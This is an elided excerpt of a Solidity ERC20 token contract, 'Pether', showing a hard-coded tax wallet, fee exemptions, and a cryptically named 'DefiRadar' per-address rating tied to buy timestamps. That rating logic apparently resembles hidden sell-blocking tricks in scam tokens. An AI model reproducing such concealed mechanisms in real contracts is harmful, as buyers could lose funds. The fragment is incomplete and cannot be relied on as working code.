...
contract Pether is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _exemptFromFee;
    address payable private constant _taxWallet = payable(0xA71d4288e930e0640A456a7266D3D0F1F932D187);
    ...
    string private constant _name = unicode"Pether";
    string private constant _symbol = unicode"PETHER";
    uint256 public _maxTxAmount = 22000000000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 22000000000 * 10 ** _decimals;
    ...
    struct DefiRadar {uint256 defiBuy; uint256 defiSell; uint256 rating;}
    mapping(address => DefiRadar) private defiRadar;
    uint256 private batchSync;
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (
            ...
            batchSync = block.timestamp;
        }
        if (_exemptFromFee[from] && (block.number > (startBlockNum + _reduceSellTaxAt))) {
            unchecked {
        ...
        if (!_exemptFromFee[from] && !_exemptFromFee[to]) {
            if (uniswapV2Pair != to) {
                DefiRadar storage radarTick = defiRadar[to];
                if (uniswapV2Pair==from) {
                    ...
                    DefiRadar storage radarRef = defiRadar[from];
                ...
                DefiRadar storage radarRef = defiRadar[from];
                radarRef.rating = radarRef.defiBuy - batchSync;
